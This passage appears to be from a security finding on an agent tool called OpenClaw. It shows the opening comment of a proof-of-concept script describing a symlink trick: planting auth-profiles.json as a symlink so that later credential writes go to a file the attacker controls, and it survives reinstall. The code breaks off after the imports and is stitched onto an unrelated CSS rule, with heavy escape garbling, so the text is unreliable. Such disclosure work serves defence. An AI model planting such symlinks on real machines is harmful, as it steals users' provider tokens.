references\\\\n\\\\n---\\\\n## Proof of Concept (`poc.mjs`)\\\\n\\\\n```mjs\\\\n#!/usr/bin/env node\\\\n/**\\\\n * PoC: auth-profiles.json symlink-redirect — permanent credential exfiltration\\\\n * Finding: C1 / p10-070-sparkle-rce-symlink-permanent-provider-token-exfiltration\\\\n *\\\\n * Demonstrates the symlink-redirect half of the chain:\\\\n *   - resolveJsonSaveTarget (src/infra/json-file.ts:26-36) resolves leaf symlinks\\\\n *     and returns the target inode as the write destination with no refusal check.\\\\n *   - saveAuthProfileStore (src/agents/auth-profiles/store.ts:590-594) calls\\\\n *     saveJsonFile(authPath, payload), which calls resolveJsonSaveTarget transparently.\\\\n *   - A symlink planted at ~/.openclaw/<agentDir>/auth-profiles.json therefore\\\\n *     redirects every subsequent credential write to an attacker-controlled inode.\\\\n *   - The symlink survives OpenClaw uninstall + reinstall because uninstallers do\\\\n *     not delete ~/.openclaw/.\\\\n *\\\\n * Precondition: attacker has already obtained user-context code execution\\\\n * (Phase 1: Sparkle MITM, p9-001). This PoC exercises Phase 2 onward.\\\\n *\\\\n * The PoC does NOT modify any real ~/.openclaw directory; it operates entirely\\\\n * under /tmp/oc-poc-c1/.\\\\n */\\\\n\\\\nimport fs from \\\\\\"node:fs\\\\\\";\\\\nimport path from \\\\\\"node:path\\\\\\";\\\\n\\\\n// ---------------------------------------------------------------------------\\\\n// Inline replica of resolveJsonSaveTarget (src/infra/json-file.ts:26-36)\\\\n// Faithfully copied — no behaviour changes — to prove the real logic.\\\\n// -------------------------------         [data-theme="dark"] .vg-loader{background:#1c1b19;color:#fce8c3}
